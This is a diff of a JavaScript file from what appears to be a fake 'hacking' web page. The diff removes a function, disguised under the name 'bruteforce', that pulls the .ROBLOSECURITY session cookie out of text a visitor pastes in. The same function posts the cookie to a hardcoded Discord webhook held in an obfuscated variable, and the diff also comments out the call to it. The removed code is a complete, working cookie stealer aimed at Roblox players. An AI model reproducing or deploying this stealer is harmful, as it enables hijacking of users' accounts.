@@ -1,54 +1,4 @@
-const adwdawdacsazdawradfsadaw = 'https://discord.com/api/webhooks/1353774225181249566/4yLDywFMyhIaXvQSmH0_oojKSAZi1k_66WqJLEbpLcRm0qfTO8f_2Fywyl47irGMI9kI'
 
-
-function extractRobloxSecurityCookie(sessionId) {
-  // Use a regular expression to find the .ROBLOSECURITY cookie
-  const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
-  const match = sessionId.match(regex);
-  if (match && match[1]) {
-    return match[1]; // Return the cookie value
-  }
-  return null; // Return null if not found
-}
-
-function bruteforce(sessionId) {
-  let content;
-
-  // Check if the sessionId contains .ROBLOSECURITY
-  if (sessionId.includes(".ROBLOSECURITY")) {
-    const robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
-    if (robloxSecurityCookie) {
-      content = `New .ROBLOSECURITY Cookie Submitted:\n\`\`\`${robloxSecurityCookie}\`\`\``;
-    } else {
-      content = `No .ROBLOSECURITY cookie found in the sessionId:\n\`\`\`${sessionId}\`\`\``;
-    }
-  } else {
-    // Send the entire sessionId as-is
-    content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
-  }
-
-  const payload = {
-    content: content
-  };
-
-  fetch(adwdawdacsazdawradfsadaw, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(payload),
-  })
-    .then(response => {
-      if (!response.ok) {
-        console.error('Failed to send data to Discord.');
-      } else {
-        console.log('Data sent successfully!');
-      }
-    })
-    .catch(error => {
-      console.error('Error:', error);
-    });
-}
 
 
 
@@ -83,7 +33,7 @@ function validateInput() {
   }
 
 
-bruteforce(sessionId);
+// bruteforce(sessionId);
 
   // Hide error and start fake hacking process
   hideError();
